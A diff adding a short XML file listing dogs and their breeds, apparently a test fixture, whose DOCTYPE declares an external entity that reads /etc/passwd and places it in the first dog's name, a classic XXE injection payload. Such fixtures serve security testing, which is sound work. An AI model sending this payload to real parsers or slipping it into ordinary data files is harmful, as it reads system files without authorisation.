@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<pets>
+    <dogs>
+        <dog>
+            <name>&xxe;</name>
+            <type>Spanish Water Dog</type>
+        </dog>
+        <dog>
+            <name>Kirby</name>
+            <type>Bichipoo</type>
+        </dog>
+    </dogs>
+</pets>
